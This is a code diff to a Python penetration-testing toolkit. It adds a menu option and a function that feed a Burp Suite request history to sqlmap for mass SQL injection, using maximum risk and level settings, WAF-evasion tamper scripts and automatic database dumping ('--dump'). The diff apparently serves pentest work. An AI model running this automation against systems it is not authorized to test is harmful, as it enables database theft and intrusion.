@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# webpwn - collection of common pentest tools to get initial foothold into a company
+# Collection of common pentest tools to get initial foothold into a company
 # author: Mesut Cetin
 # -*- coding: utf-8 -*-
 
@@ -31,6 +31,7 @@ from taser.utils import file_exists,delimiter2dict,delimiter2list,TaserTimeout
 from datetime import datetime
 from time import sleep
 from alive_progress import alive_bar
+import xml.etree.ElementTree as ET
 
 # print ASCII banner
 def banner():
@@ -51,8 +52,61 @@ def progress_bar():
 
 # toDo: add selfupdate from git
 
-# xingdumper tool from @l4rm4nd
 
+# sqlmap mass exploitation
+def mass_sql_injection(burp_history_xml):
+    # create the "exploitation" directory if it doesn't exist
+    if not os.path.exists("exploitation"):
+        os.makedirs("exploitation")
+    # check if sqlmap is installed
+    if not os.path.exists("/usr/bin/sqlmap"):
+        install = input("sqlmap is not installed. Do you want to install it? (Y/N) ").lower()
+        if install == "y":
+            subprocess.run(["apt-get", "install", "sqlmap"])
+        else:
+            print("sqlmap is required to run this function. Exiting.")
+            return
+
+    # parse the burp history xml file
+    try:
+        tree = ET.parse(burp_history_xml)
+        root = tree.getroot()
+    except:
+        print("Error parsing the burp history xml file. Make sure it is in the correct format and try again.")
+        return
+
+    # ask the user for sqlmap options
+    risk = input("Enter the risk level for sqlmap (default: 3): ")
+    if risk == "":
+        risk = "3"
+    level = input("Enter the level for sqlmap (default: 5): ")
+    if level == "":
+        level = "5"
+    tamper = input("Enter the tamper scripts for sqlmap (default: space2comment,between): ")
+    if tamper == "":
+        tamper = "space2comment,between"
+    threads = input("Enter the number of threads for sqlmap (default: 10): ")
+    if threads == "":
+        threads = "10"
+    more_flags = input("Do you want to set more flags for sqlmap? (Y/N) ").lower()
+    if more_flags == "y":
+        flags = input("Enter the flags: ")
+    else:
+        flags = ""
+
+    # run sqlmap with the options
+    command = ["sqlmap", "-r", burp_history_xml, "--risk", risk, "--level", level, "--batch", "--dump", "--tamper", tamper, "--threads", threads]
+    if flags:
+        command += flags.split()
+    sqlmap = subprocess.Popen(command, stdout=subprocess.PIPE)
+    # print the full output of sqlmap
+    with open("exploitation/sqli_full_output.txt", "w") as f:
+        for line in sqlmap.stdout:
+            print(line.decode("utf-8").strip())
+            # save the full output of the scan to a file
+            f.write(line.decode("utf-8"))
+
+# xingdumper tool from @l4rm4nd
 def xing_dumper():
 	def login(mail, password):
 			s = requests.Session()
@@ -539,6 +593,7 @@ def main_menu():
 		fields = ('(1) Email addresses with OSINT\n'
 				'(2) Subdomain Enumeration\n'
 				'(3) NTLM endpoint enumeration\n'
+                '(4) SQL Mass Injection\n'
 		  	  '(q) to quit\n\n'
 				  'Your choice: ')
 		choice = input(fields)
@@ -701,14 +756,26 @@ def main_menu():
 					print("See you next time!")
 				except:
 					print("Something went wrong!")
-
+		elif choice == "4":
+		        # print instructions on how to generate the burp history xml file
+			print("To generate the burp history xml file:")
+			print("1) In Burp Suite, go to the 'HTTP History' tab after browsing your target.")
+			print("2) Select 'Show only in scope'.")
+			print("3) Press CTRL+A to mark all HTTP requests.")
+			print("4) Right click -> 'Save item as...' and save the file as 'sql.xml'.\n")
+			# ask the user for the location of the burp history xml file
+			burp_history_xml = input("Enter the location of the burp history xml file (default: sql.xml): ")
+			# if the user didn't provide a location, use the default value
+			if not burp_history_xml:
+				burp_history_xml = "sql.xml"
+	
+			mass_sql_injection(burp_history_xml)  
 		elif choice == "q":
 			print("Ok, bye!")
 			break
 		else:
 			print(Fore.RED + "\nNo valid input detected!")
 			print(Fore.RESET)
-
 
 # start main functions
 if __name__ == "__main__":
